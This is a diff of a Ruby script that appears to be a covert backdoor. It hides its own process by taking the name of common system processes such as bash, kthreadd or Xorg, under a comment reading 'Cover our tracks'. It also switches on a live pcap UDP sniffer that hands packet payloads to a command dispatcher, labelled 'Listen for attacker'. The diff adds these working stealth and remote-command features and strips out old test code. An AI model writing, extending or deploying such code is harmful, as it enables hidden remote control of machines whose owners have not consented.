@@ -3,6 +3,7 @@
 require 'optparse'
 require 'rubygems'
 require 'pcaplet'
+require 'thread'
 require './dispatch.rb'
 include Pcap
 
@@ -38,8 +39,6 @@ dev = options[:dev]? options[:dev] : Pcap.lookupdev
 # Listening port
 port = options[:port]? options[:port] : 8000
 
-dispatcher = Dispatch.new
-
 # ---------------------------------------------------------
 # Cover our tracks
 # ---------------------------------------------------------
@@ -47,7 +46,7 @@ dispatcher = Dispatch.new
 # We'll choose a common process that is already running on the machine to mask this process with
 # List in order of preference, as we'll choose the first one that is running on the machine. If none
 # are found, the first process name will be used - list wisely.
-covers = ['mdworker','bash']
+covers = ['bash','mdworker','Xorg','kthreadd','gnome-terminal']
 top = `top -l 1`
 
 # If none of the processes are found running, we'll just go with the first one
@@ -66,42 +65,15 @@ end
 # Listen for attacker
 # ---------------------------------------------------------
 
-# cap = Pcap::Capture.open_live(dev)
-# cap.setfilter("udp")
-# cap.loop do |pkt|
-# 	print pkt, "\n"
-# end
-# cap.close
+cap = Pcap::Capture.open_live(dev)
+cap.setfilter("udp")
 
-# ---------------------------------------------------------
-# Listen for attacker
-# ---------------------------------------------------------
+cap.loop do |pkt|
+	p "Command receievd from " + pkt.ip_src.to_s
+	p Dispatch.new pkt.udp_data.to_s
+end
 
-# addr = Socket.pack_sockaddr_in(1024, destination_ip)
-# 3.times do |i|
-# 	ip = IP.new do |b|
-# 		# ip_v and ip_hl are set for us by IP class
-# 		b.ip_tos  = 0
-# 		b.ip_id   = i + 1
-# 		b.ip_off  = 0
-# 		b.ip_ttl  = 64
-# 		b.ip_p    = Socket::IPPROTO_RAW
-# 		b.ip_src  = "127.0.0.1"
-# 		b.ip_dst  = "127.0.0.1"
-# 		b.body    = "just another IP hacker"
-# 		b.ip_len  = b.length
-# 		b.ip_sum  = 0 # linux will calculate this for us (QNX won't?)
-# 	end
-
-# 	out = "-"*80,
-# 		"packet sent:",
-# 		ip.inspect_detailed,
-# 		"-"*80
-# 	puts out
-# 	$stdout.flush
-# 	ssock.send(ip, 0, addr)
-# 	sleep 1
-# end
+cap.close
 
 # ---------------------------------------------------------
 # Fin
